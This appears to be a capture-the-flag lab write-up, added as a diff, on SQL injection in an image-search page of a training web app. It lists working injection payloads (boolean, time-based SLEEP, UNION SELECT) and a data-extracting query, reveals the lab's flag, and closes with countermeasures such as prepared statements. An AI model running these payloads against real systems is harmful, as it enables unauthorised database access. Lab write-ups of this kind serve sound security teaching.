@@ -1,0 +1,43 @@
+http://192.168.57.3/?page=searchimg
+
+Found a vunerability in sql injection,
+In the page "search image"
+
+By scanning the page we get this information : 
+
+The back-end DBMS is MySQL
+Web server operating system: Linux Ubuntu
+Web application technology: PHP 5.3.10, Nginx 1.8.0
+Back-end DBMS: MySQL >= 5.5
+
+A faille have been found in the "id"
+
+The type of faille are :
+
+- boolean-based blind : test with  "1 or 1=1" this give a list of everything  
+
+- error-based: test with anything that not a number 
+
+- time-based blind : test with "1 AND (SELECT 8903 FROM (SELECT(SLEEP(5)))ASLd)"
+
+- UNION query : test it with "1 UNION ALL SELECT NULL"
+
+You can type "1 or 1=1 UNION select url, comment from list_images"
+It will give you the the corresponding message: 
+
+    "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
+
+That give you this flags.
+
+flag = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+-------------------------- Countermeasure ----------------------------------------
+    - Don't display any error message from the sql request
+    - Use Prepared Statements :
+        exemple :   dbh->prepare("SELECT * FROM users WHERE USERNAME = ? AND PASSWORD = ?");
+                    stmt->execute(array($username, $password));
+    - Limite privilege on the query request, you should limit the search to only what originaly show in the result,
+        only first name and surname 
+
+https://md5hashing.net/hash/md5/5ff9d0165b4f92b14994e5c685cdce28
+https://www.dcode.fr/md5-hash
